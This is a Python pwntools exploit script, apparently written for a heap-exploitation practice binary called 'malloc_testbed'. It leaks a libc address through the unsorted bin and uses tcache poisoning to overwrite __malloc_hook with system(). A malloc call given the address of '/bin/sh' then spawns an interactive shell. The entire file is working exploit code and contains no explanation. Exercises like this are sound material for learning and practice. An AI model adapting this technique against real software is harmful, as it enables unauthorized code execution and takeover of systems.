#!/usr/bin/python3
from pwn import *
#context.log_level='DEBUG'

p = process("./malloc_testbed")
elf = ELF("./malloc_testbed", checksec=False)
libc = elf.libc

def malloc(size):
	p.sendline("1")
	p.sendlineafter("size: ", f"{size}")
	p.recvuntil("> ")

def free(idx):
	p.sendline("2")
	p.sendlineafter("index: ", f"{idx}")
	p.recvuntil("> ")

def edit(idx, data):
	p.sendline("4")
	p.sendlineafter("index: ", f"{idx}")
	p.sendlineafter("data: ", data)
	p.recvuntil("> ")

def read(idx):
	p.sendline("5")
	p.sendlineafter("index: ", f"{idx}")
	p.recvuntil("> ")

if __name__=="__main__":

	pause()
	for i in range(9): # 0 -> 8
		malloc(0x300)

	for i in range(7): # 0 -> 6
		free(i)

	free(7)

	# current pointer: 0x7fef4aaefca0
	# current base: 0x7fef4a741000

	p.sendline("5")
	p.sendlineafter("index: ", "7")
	leak = u64(p.recv(6).ljust(8, b"\x00"))
	log.info("LIBC@LEAK: " + hex(leak))

	current_pointer = 0x7fef4aaefca0
	current_base = 0x7fef4a741000

	offset = current_pointer - current_base
	libc.address = leak - offset
	log.info("LIBC@: " + hex(libc.address))

	for i in range(9): # 9 -> 17
		malloc(0x300)

	malloc(0x24) # 18
	free(18)
	edit(18, p64(libc.sym.__malloc_hook))
	malloc(0x24) # 19
	malloc(0x24) # 20
	edit(20, p64(libc.symbols['system']))
	bin_sh = next(libc.search(b"/bin/sh\x00"))
	malloc(bin_sh)

	p.interactive()
